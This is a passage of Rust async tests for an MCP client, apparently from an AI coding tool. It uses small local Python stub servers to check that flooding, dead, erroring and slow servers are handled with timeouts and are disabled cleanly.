        );
        let seen2 = seen2.into_inner().unwrap();
        assert_eq!(seen2.len(), 1, "only beta reconnected: {seen2:?}");
        assert_eq!(seen2[0].0, "beta");

        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A server that floods notifications and never answers must not hang the
    /// agent: `request` bails after MAX_SKIPPED_MESSAGES, so connect returns with
    /// no tools (the test completing at all is the real assertion — pre-fix it
    /// would loop forever). Gated on python3 like the e2e above.
    #[cfg(unix)]
    #[tokio::test]
    async fn mcp_flooding_server_does_not_hang() {
        if tokio::process::Command::new("python3")
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .await
            .is_err()
        {
            return;
        }
        let dir = std::env::temp_dir().join(format!("aivo-mcp-flood-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        // Reads the initialize request, then streams notifications forever — never
        // sending a response with our id.
        let script = r#"
import sys, json, itertools
sys.stdin.readline()
for i in itertools.count():
    sys.stdout.write(json.dumps({"jsonrpc":"2.0","method":"notifications/x","params":{"i":i}})+"\n")
    sys.stdout.flush()
"#;
        let config = json!({"mcpServers":{"flood":{"command":"python3","args":["-c", script]}}});
        std::fs::write(dir.join(".mcp.json"), config.to_string()).unwrap();

        // Bounded overall by the test harness; the per-request cap is what makes
        // this return rather than spin forever.
        let client = McpClient::connect_isolated(&dir, &HashSet::new()).await;
        assert!(
            !client.has_tools(),
            "flooding server should fail handshake, not hang or expose tools"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A server that handshakes but exits on the first `tools/call` triggers a
    /// transport failure (EOF mid-request). The server is disabled for the
    /// session, so that call AND every later one fast-fail with a clear message
    /// instead of each waiting the full call timeout. Gated on python3.
    #[cfg(unix)]
    #[tokio::test]
    async fn mcp_transport_failure_disables_server() {
        if tokio::process::Command::new("python3")
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .await
            .is_err()
        {
            return;
        }
        let dir = std::env::temp_dir().join(format!("aivo-mcp-dead-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        // Answers initialize + tools/list, then exits on the first tools/call.
        let script = r#"
import sys, json
def send(o):
    sys.stdout.write(json.dumps(o)+"\n"); sys.stdout.flush()
for line in sys.stdin:
    line=line.strip()
    if not line: continue
    m=json.loads(line)
    method=m.get("method")
    if method=="initialize":
        send({"jsonrpc":"2.0","id":m["id"],"result":{"protocolVersion":"2024-11-05","capabilities":{},"serverInfo":{"name":"dead","version":"1"}}})
    elif method=="tools/list":
        send({"jsonrpc":"2.0","id":m["id"],"result":{"tools":[{"name":"echo","description":"e","inputSchema":{"type":"object"}}]}})
    elif method=="tools/call":
        sys.exit(0)
"#;
        let config = json!({"mcpServers":{"dead":{"command":"python3","args":["-c", script]}}});
        std::fs::write(dir.join(".mcp.json"), config.to_string()).unwrap();

        let client = McpClient::connect_isolated(&dir, &HashSet::new()).await;
        assert!(client.has_tools(), "handshake should succeed");
        // First call hits the transport failure (server exits → EOF) and disables it.
        let first = client
            .call("mcp__dead__echo", &json!({}))
            .await
            .unwrap_err();
        assert!(
            first.contains("disabled for this session"),
            "first call should report the disable: {first}"
        );
        // Second call fast-fails on the dead flag — no wait, clear message.
        let second = client
            .call("mcp__dead__echo", &json!({}))
            .await
            .unwrap_err();
        assert!(
            second.contains("unavailable"),
            "second call should fast-fail: {second}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A JSON-RPC error response means the server is healthy — it just rejected
    /// one call. The server stays enabled so later calls still work. Gated on
    /// python3.
    #[cfg(unix)]
    #[tokio::test]
    async fn mcp_protocol_error_keeps_server_alive() {
        if tokio::process::Command::new("python3")
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .await
            .is_err()
        {
            return;
        }
        let dir = std::env::temp_dir().join(format!("aivo-mcp-proto-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        // tools/call returns a JSON-RPC error for text=="boom", else echoes.
        let script = r#"
import sys, json
def send(o):
    sys.stdout.write(json.dumps(o)+"\n"); sys.stdout.flush()
for line in sys.stdin:
    line=line.strip()
    if not line: continue
    m=json.loads(line)
    method=m.get("method")
    if method=="initialize":
        send({"jsonrpc":"2.0","id":m["id"],"result":{"protocolVersion":"2024-11-05","capabilities":{},"serverInfo":{"name":"p","version":"1"}}})
    elif method=="tools/list":
        send({"jsonrpc":"2.0","id":m["id"],"result":{"tools":[{"name":"echo","description":"e","inputSchema":{"type":"object","properties":{"text":{"type":"string"}}}}]}})
    elif method=="tools/call":
        a=m["params"].get("arguments",{})
        if a.get("text")=="boom":
            send({"jsonrpc":"2.0","id":m["id"],"error":{"code":-32000,"message":"boom rejected"}})
        else:
            send({"jsonrpc":"2.0","id":m["id"],"result":{"content":[{"type":"text","text":"echoed: "+str(a.get("text",""))}]}})
"#;
        let config = json!({"mcpServers":{"p":{"command":"python3","args":["-c", script]}}});
        std::fs::write(dir.join(".mcp.json"), config.to_string()).unwrap();

        let client = McpClient::connect_isolated(&dir, &HashSet::new()).await;
        assert!(client.has_tools());
        // A protocol error surfaces to the model but does NOT disable the server.
        let err = client
            .call("mcp__p__echo", &json!({"text":"boom"}))
            .await
            .unwrap_err();
        assert!(err.contains("boom rejected"), "got: {err}");
        assert!(
            !err.contains("disabled"),
            "a protocol error must not disable the server: {err}"
        );
        // The server is still usable afterward.
        let ok = client
            .call("mcp__p__echo", &json!({"text":"again"}))
            .await
            .unwrap();
        assert!(
            ok.contains("echoed: again"),
            "server wrongly disabled: {ok}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A `tools/call` slower than the (short, injected) handshake timeout must
    /// still succeed — pins the handshake/call timeout split from ac4253b.
    #[cfg(unix)]
    #[tokio::test]
    async fn mcp_tool_call_outlives_the_handshake_timeout() {
        if tokio::process::Command::new("python3")
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .await
            .is_err()
        {
            return;
        }
        let dir = std::env::temp_dir().join(format!(
            "aivo-mcp-slowcall-{}-{}",
            std::process::id(),
            line!()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        // Instant handshake; tools/call sleeps past the injected handshake timeout.
        let script = r#"
import sys, json, time
def send(o):
    sys.stdout.write(json.dumps(o)+"\n"); sys.stdout.flush()
for line in sys.stdin:
    line=line.strip()
    if not line: continue
    m=json.loads(line)
    method=m.get("method")
    if method=="initialize":
        send({"jsonrpc":"2.0","id":m["id"],"result":{"protocolVersion":"2024-11-05","capabilities":{},"serverInfo":{"name":"s","version":"1"}}})
    elif method=="tools/list":
        send({"jsonrpc":"2.0","id":m["id"],"result":{"tools":[{"name":"slow","description":"s","inputSchema":{"type":"object"}}]}})
    elif method=="tools/call":
        time.sleep(3.5)
        send({"jsonrpc":"2.0","id":m["id"],"result":{"content":[{"type":"text","text":"finally"}]}})
"#;
        let config = json!({"mcpServers":{"s":{"command":"python3","args":["-c", script]}}});
        std::fs::write(dir.join(".mcp.json"), config.to_string()).unwrap();

        let client = McpClient::connect_inner(
            None,
            &dir,
            &HashSet::new(),
            Duration::from_secs(2),
            None,
            None,
        )
        .await;
        if !client.has_tools() {
            // Environment too slow to handshake python3 in 2 s — skip, don't flake.
            let _ = std::fs::remove_dir_all(&dir);
            return;
        }
        let out = client
            .call("mcp__s__slow", &json!({}))
            .await
            .expect("a call slower than the handshake timeout must still succeed");
        assert!(out.contains("finally"), "got: {out}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A server that never answers `initialize` is cut off by the handshake
    /// timeout (here a short injected one), so connect returns promptly with no
    /// tools rather than blocking for the full default.
    #[cfg(unix)]
    #[tokio::test]
    async fn mcp_handshake_timeout_is_honored() {
        if tokio::process::Command::new("python3")
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .await
            .is_err()
        {
            return;
        }
        let dir = std::env::temp_dir().join(format!("aivo-mcp-slow-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        // Reads the initialize request, then sleeps — never responding.
        let script = "import sys, time\nsys.stdin.readline()\ntime.sleep(60)\n";
        let config = json!({"mcpServers":{"slow":{"command":"python3","args":["-c", script]}}});
        std::fs::write(dir.join(".mcp.json"), config.to_string()).unwrap();

        let started = tokio::time::Instant::now();
        let client = McpClient::connect_inner(
            None,
            &dir,
            &HashSet::new(),
            Duration::from_millis(300),
            None,
            None,
        )
        .await;
        assert!(
            !client.has_tools(),
            "a non-responding server exposes no tools"
        );
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "handshake timeout was not honored (took {:?})",
            started.elapsed()
        );
        let _ = std::fs::remove_dir_all(&dir);
    }
}
